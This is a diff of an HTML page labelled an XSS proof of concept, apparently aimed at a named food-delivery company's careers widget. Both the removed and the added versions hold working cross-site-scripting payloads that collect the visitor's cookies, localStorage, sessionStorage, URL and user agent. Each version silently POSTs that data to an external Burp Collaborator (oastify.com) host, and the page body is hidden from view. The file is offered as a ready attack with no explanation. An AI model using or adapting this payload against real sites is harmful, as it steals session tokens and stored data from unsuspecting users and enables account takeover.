@@ -1,30 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Just Eat Widget XSS</title>
+  <meta charset="UTF-8">
+  <title>XSS PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { display: none; }
+  </style>
 </head>
 <body>
-  <h1>🔒 Job Openings</h1>
-  <div class="ph-widget" as-element="x">
-    <img src onerror="(()=>{try{
-      const d=document,c=d.cookie,l=localStorage,s=sessionStorage,
-      j=JSON.stringify;
-      fetch('https://200a5t2lv0ggi1go5rt2t6982z8rwhk6.oastify.com',{
-        method:'POST',mode:'no-cors',
-        body:j({
-          cookie:c,
-          localStorage:j(l),
-          sessionStorage:j(s),
-          url:location.href,
-          origin:location.origin,
-          referrer:document.referrer,
-          ua:navigator.userAgent,
-          time:new Date().toISOString()
-        })
-      });
-    }catch(e){}})()">
-  </div>
-  <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
-  <script>window.PhEnhancer && PhEnhancer();</script>
+<script>
+(async () => {
+  try {
+    const j = JSON.stringify;
+    const data = {
+      cookie: document.cookie,
+      localStorage: j(localStorage),
+      sessionStorage: j(sessionStorage),
+      location: location.href,
+      origin: location.origin,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      domain: document.domain,
+      time: new Date().toISOString()
+    };
+
+    await fetch('https://zdg7iqfi8xtdvytlio6z63m5fwlp9fx4.oastify.com', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: j(data)
+    });
+  } catch(e) {
+    // silently fail to avoid breaking any flow
+  }
+})();
+</script>
 </body>
 </html>
